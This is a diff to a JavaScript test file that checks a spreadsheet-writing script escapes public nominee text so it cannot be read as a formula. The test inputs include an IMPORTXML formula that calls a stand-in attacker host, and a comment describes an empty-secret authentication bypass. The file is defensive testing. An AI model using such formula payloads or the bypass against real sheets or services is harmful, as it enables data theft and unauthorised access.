@@ -250,18 +250,37 @@ const GS = await import('node:fs').then((fs) =>
 /* setValues treats a leading "=" as a FORMULA. Nominee text is written by the
    public, so a bio of =IMPORTXML(...) would exfiltrate the panel's sheet the
    moment a judge opened the tab. Setting the format to text must come FIRST. */
-test('every cell is written as text, with the format set before the values', () => {
-  const write = /function writeTextRow[\s\S]*?\n}/.exec(GS);
-  assert.ok(write, 'writeTextRow must exist');
-  const body = write[0];
-  assert.match(body, /setNumberFormat\('@'\)/, 'the range must be forced to plain text');
-  assert.ok(
-    body.indexOf("setNumberFormat('@')") < body.indexOf('setValues'),
-    'the format must be set BEFORE the values, or the formula is already evaluated'
-  );
-  assert.ok(!/appendRow/.test(GS), 'appendRow bypasses the text format');
+/* The earlier version of this test matched source text and passed throughout
+   the period the guard did not work at all. It asserted setNumberFormat came
+   before setValues, which is true and irrelevant: the format governs the
+   spreadsheet UI, not setValues, which parses a leading "=" whatever the cell
+   format is. Confirmed twice against the live sheet on 2026-10-19.
+
+   So this lifts asText out of the script and RUNS it. That covers our own
+   logic -- which strings get the marker -- which is the part we control. What
+   it still cannot cover is Sheets consuming the apostrophe on write; only a
+   real nomination shows that, and one was used to confirm it. */
+test('a value that would be read as a formula is marked as text', () => {
+  const source = /function asText\(value\)[\s\S]*?\n}/.exec(GS);
+  assert.ok(source, 'asText must exist');
+  const asText = new Function('return ' + source[0] + '; ')();
+
+  for (const hostile of ['=1+1', '=IMPORTXML("https://evil.example","//a")', '+1+1', '-1+1', '@SUM(A1)']) {
+    assert.equal(asText(hostile), "'" + hostile, `${hostile} was left to be parsed`);
+  }
+  for (const ordinary of ['She built the first compiler.', 'Director, Payments', '', 'a=b', '1+1']) {
+    assert.equal(asText(ordinary), ordinary, `${ordinary} was needlessly altered`);
+  }
+  assert.equal(asText(undefined), 'undefined');
 });
 
+test('every cell is written through asText, and no row bypasses it', () => {
+  const write = /function writeTextRow[\s\S]*?\n}/.exec(GS);
+  assert.ok(write, 'writeTextRow must exist');
+  assert.match(write[0], /values\.map\(asText\)/, 'the row must be mapped through asText');
+  assert.ok(!/values\.map\(String\)/.test(write[0]), 'the unguarded String map must be gone');
+  assert.ok(!/appendRow/.test(GS), 'appendRow bypasses the guard entirely');
+});
 /* An empty SECRET makes the length check 0 === 0 and the compare loop run zero
    times, so every request authenticates -- including one carrying no secret.
    The guard must run before anything else in doPost. */
